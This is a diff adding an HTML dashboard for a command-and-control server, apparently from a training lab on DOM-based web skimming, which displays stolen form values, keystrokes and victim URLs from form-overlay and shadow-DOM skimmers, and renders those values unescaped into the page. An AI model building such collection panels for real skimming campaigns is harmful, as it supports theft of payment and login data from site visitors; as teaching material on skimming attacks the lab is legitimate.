@@ -1,0 +1,390 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>C2 Server Dashboard - Lab 2 DOM Skimming</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
+        color: #ffffff;
+        min-height: 100vh;
+      }
+
+      .header {
+        background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%);
+        padding: 1rem 2rem;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+      }
+
+      .header h1 {
+        font-size: 1.5rem;
+        font-weight: 700;
+      }
+
+      .header p {
+        opacity: 0.9;
+        margin-top: 0.25rem;
+      }
+
+      .container {
+        max-width: 1400px;
+        margin: 0 auto;
+        padding: 2rem;
+      }
+
+      .stats-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 1.5rem;
+        margin-bottom: 2rem;
+      }
+
+      .stat-card {
+        background: rgba(255, 255, 255, 0.05);
+        border-radius: 0.75rem;
+        padding: 1.5rem;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+      }
+
+      .stat-card h3 {
+        font-size: 0.875rem;
+        text-transform: uppercase;
+        opacity: 0.7;
+        margin-bottom: 0.5rem;
+        letter-spacing: 0.05em;
+      }
+
+      .stat-card p {
+        font-size: 2rem;
+        font-weight: 700;
+      }
+
+      .data-section {
+        background: rgba(255, 255, 255, 0.05);
+        border-radius: 0.75rem;
+        padding: 1.5rem;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+      }
+
+      .data-section h2 {
+        font-size: 1.25rem;
+        margin-bottom: 1rem;
+      }
+
+      .record {
+        background: rgba(255, 255, 255, 0.03);
+        border-radius: 0.5rem;
+        padding: 1rem;
+        margin-bottom: 1rem;
+        border-left: 3px solid #dc2626;
+      }
+
+      .record-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 0.75rem;
+      }
+
+      .record-type {
+        background: #dc2626;
+        color: white;
+        padding: 0.25rem 0.75rem;
+        border-radius: 0.25rem;
+        font-size: 0.75rem;
+        font-weight: 600;
+        text-transform: uppercase;
+      }
+
+      .record-time {
+        font-size: 0.875rem;
+        opacity: 0.7;
+      }
+
+      .record-data {
+        display: grid;
+        gap: 0.5rem;
+      }
+
+      .data-item {
+        display: flex;
+        gap: 0.5rem;
+      }
+
+      .data-label {
+        font-weight: 600;
+        min-width: 120px;
+        opacity: 0.7;
+      }
+
+      .data-value {
+        font-family: 'Monaco', 'Courier New', monospace;
+        color: #60a5fa;
+      }
+
+      .sessions-list {
+        margin-top: 0.75rem;
+        padding-left: 1rem;
+        border-left: 2px solid rgba(255, 255, 255, 0.1);
+      }
+
+      .session-item {
+        background: rgba(255, 255, 255, 0.02);
+        padding: 0.75rem;
+        border-radius: 0.25rem;
+        margin-bottom: 0.5rem;
+      }
+
+      .no-data {
+        text-align: center;
+        padding: 3rem;
+        opacity: 0.5;
+      }
+
+      .refresh-btn {
+        background: #dc2626;
+        color: white;
+        border: none;
+        padding: 0.5rem 1rem;
+        border-radius: 0.5rem;
+        cursor: pointer;
+        font-size: 0.875rem;
+        margin-bottom: 1rem;
+      }
+
+      .refresh-btn:hover {
+        background: #991b1b;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header">
+      <h1>🎯 C2 Server Dashboard - Lab 2: DOM-Based Skimming</h1>
+      <p>Command & Control Server for DOM Monitor, Form Overlay, and Shadow DOM Attacks</p>
+    </div>
+
+    <div class="container">
+      <div class="stats-grid">
+        <div class="stat-card">
+          <h3>Total Attacks</h3>
+          <p id="totalAttacks">0</p>
+        </div>
+        <div class="stat-card">
+          <h3>DOM Monitor</h3>
+          <p id="domMonitor">0</p>
+        </div>
+        <div class="stat-card">
+          <h3>Form Overlay</h3>
+          <p id="formOverlay">0</p>
+        </div>
+        <div class="stat-card">
+          <h3>Shadow DOM</h3>
+          <p id="shadowDom">0</p>
+        </div>
+        <div class="stat-card">
+          <h3>Unique Victims</h3>
+          <p id="uniqueVictims">0</p>
+        </div>
+        <div class="stat-card">
+          <h3>Uptime</h3>
+          <p id="uptime">0h 0m</p>
+        </div>
+      </div>
+
+      <div class="data-section">
+        <h2>📊 Attack Data</h2>
+        <button class="refresh-btn" onclick="loadData()">🔄 Refresh</button>
+        <div id="recentData"></div>
+      </div>
+    </div>
+
+    <script>
+      function formatTime(timestamp) {
+        const date = new Date(timestamp)
+        return date.toLocaleString()
+      }
+
+      function extractDataFromRecord(record) {
+        const result = {
+          type: record.type || record.attackType || 'unknown',
+          timestamp: record.serverTimestamp || record.timestamp,
+          metadata: record.metadata || {},
+          capturedData: []
+        }
+
+        // Handle shadow DOM captures
+        if (record.type === 'shadow_dom_capture' && record.sessions) {
+          record.sessions.forEach(session => {
+            if (session.capturedValues && session.capturedValues.length > 0) {
+              session.capturedValues.forEach(capture => {
+                if (capture.value) {
+                  result.capturedData.push({
+                    field: session.elementInfo?.name || session.elementInfo?.tagName || 'unknown',
+                    value: capture.value,
+                    eventType: capture.eventType,
+                    timestamp: capture.timestamp
+                  })
+                }
+              })
+            }
+            if (session.capturedKeystrokes && session.capturedKeystrokes.length > 0) {
+              session.capturedKeystrokes.forEach(keystroke => {
+                result.capturedData.push({
+                  field: session.elementInfo?.name || 'keystroke',
+                  value: keystroke.key || keystroke.value,
+                  eventType: 'keypress',
+                  timestamp: keystroke.timestamp
+                })
+              })
+            }
+          })
+        }
+
+        // Handle form overlay captures
+        if (record.type === 'form_overlay_capture' && record.capturedData) {
+          Object.entries(record.capturedData).forEach(([field, value]) => {
+            if (value) {
+              result.capturedData.push({
+                field: field,
+                value: value,
+                eventType: 'form_submit'
+              })
+            }
+          })
+        }
+
+        // Handle DOM monitor sessions
+        if (record.type === 'dom_monitor_session' && record.fieldData) {
+          if (record.fieldData.values && record.fieldData.values.length > 0) {
+            const latestValue = record.fieldData.values[record.fieldData.values.length - 1]
+            result.capturedData.push({
+              field: record.fieldData.fieldName || 'unknown',
+              value: latestValue.value,
+              eventType: latestValue.eventType,
+              timestamp: latestValue.timestamp
+            })
+          }
+        }
+
+        return result
+      }
+
+      function displayRecord(record, index) {
+        const data = extractDataFromRecord(record)
+        
+        let capturedHtml = ''
+        if (data.capturedData.length > 0) {
+          capturedHtml = '<div class="sessions-list">'
+          data.capturedData.forEach(item => {
+            if (item.value && item.value.trim() !== '') {
+              capturedHtml += `
+                <div class="session-item">
+                  <div class="data-item">
+                    <span class="data-label">Field:</span>
+                    <span class="data-value">${item.field}</span>
+                  </div>
+                  <div class="data-item">
+                    <span class="data-label">Value:</span>
+                    <span class="data-value">${item.value}</span>
+                  </div>
+                  ${item.eventType ? `
+                  <div class="data-item">
+                    <span class="data-label">Event:</span>
+                    <span class="data-value">${item.eventType}</span>
+                  </div>
+                  ` : ''}
+                </div>
+              `
+            }
+          })
+          capturedHtml += '</div>'
+        } else {
+          capturedHtml = '<div class="no-data" style="padding: 1rem;">No captured values in this session</div>'
+        }
+
+        return `
+          <div class="record">
+            <div class="record-header">
+              <span class="record-type">${data.type}</span>
+              <span class="record-time">${formatTime(data.timestamp)}</span>
+            </div>
+            <div class="record-data">
+              ${data.metadata.url ? `
+              <div class="data-item">
+                <span class="data-label">URL:</span>
+                <span class="data-value">${data.metadata.url}</span>
+              </div>
+              ` : ''}
+              ${data.metadata.userAgent ? `
+              <div class="data-item">
+                <span class="data-label">User Agent:</span>
+                <span class="data-value">${data.metadata.userAgent.substring(0, 80)}...</span>
+              </div>
+              ` : ''}
+            </div>
+            ${capturedHtml}
+          </div>
+        `
+      }
+
+      async function loadData() {
+        try {
+          // Load statistics
+          const statsResponse = await fetch('/stats')
+          const stats = await statsResponse.json()
+
+          document.getElementById('totalAttacks').textContent = stats.totalRequests || 0
+          document.getElementById('domMonitor').textContent = stats.domMonitorSessions || 0
+          document.getElementById('formOverlay').textContent = stats.formOverlayCaptues || 0
+          document.getElementById('shadowDom').textContent = stats.shadowDomCaptures || 0
+          document.getElementById('uniqueVictims').textContent = stats.uniqueVictims || 0
+
+          if (stats.uptimeHours) {
+            const hours = Math.floor(stats.uptimeHours)
+            const minutes = Math.floor((stats.uptimeHours - hours) * 60)
+            document.getElementById('uptime').textContent = `${hours}h ${minutes}m`
+          }
+
+          // Load all stolen data
+          const stolenResponse = await fetch('/api/stolen')
+          const allData = await stolenResponse.json()
+
+          const recentContainer = document.getElementById('recentData')
+
+          if (allData.length === 0) {
+            recentContainer.innerHTML =
+              '<div class="no-data">No attack data yet. Trigger the attack in Lab 2 to see data appear here.</div>'
+          } else {
+            // Sort by timestamp (newest first)
+            const sorted = allData
+              .filter(record => record.serverTimestamp || record.timestamp)
+              .sort((a, b) => (b.serverTimestamp || b.timestamp) - (a.serverTimestamp || a.timestamp))
+
+            recentContainer.innerHTML = sorted
+              .slice(0, 20) // Show most recent 20
+              .map((record, index) => displayRecord(record, index))
+              .join('')
+          }
+        } catch (error) {
+          console.error('Error loading data:', error)
+          document.getElementById('recentData').innerHTML = 
+            `<div class="no-data">Error loading data: ${error.message}</div>`
+        }
+      }
+
+      // Load data on page load
+      loadData()
+
+      // Auto-refresh every 5 seconds
+      setInterval(loadData, 5000)
+    </script>
+  </body>
+</html>
